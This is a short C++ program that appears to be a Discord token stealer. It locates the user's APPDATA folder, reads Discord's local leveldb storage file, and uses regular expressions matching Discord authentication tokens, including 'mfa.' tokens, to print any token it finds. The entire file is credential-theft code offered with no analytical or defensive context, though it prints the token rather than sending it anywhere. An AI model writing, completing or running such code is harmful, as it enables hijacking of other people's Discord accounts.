#include <iostream>
#include <fstream>
#include <regex> 

using namespace std;
    size_t sz = 0;
    char* szBuf;    
    errno_t Environment = _dupenv_s(&szBuf, &sz, "APPDATA");
    string AppData = szBuf;
    string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
    string Token = "[oken";
    string Content;

string readAllText(const char* filename)
{
  FILE* fp;
  fopen_s(&fp, filename, "rb");
  if (fp) {
     fseek(fp, 0, SEEK_END);
     Content.resize(ftell(fp));
     rewind(fp);
     fread(&Content[0], 1, Content.size(), fp);
     fclose(fp);
     return(Content);
  } 
}

int main()
{
    smatch smatch;
    try {
        string data = readAllText(levelDB.c_str());
        if (data.find(Token, 0) != string::npos) {
           regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
           if (regex_search(data, smatch, x) == true) {
               cout << smatch.str() << '\n';
           } else {
               regex y(R"(mfa\.[\w-]{84})");
               if (regex_search(data, smatch, y) == true) {
                  cout << smatch.str() << '\n';
               } else {
                  cout << "[REGEX] Not Found" << '\n';
               }
           }
        }
        else {
            return 0;
        }
    } catch (exception) {
        return 0;
    }
}
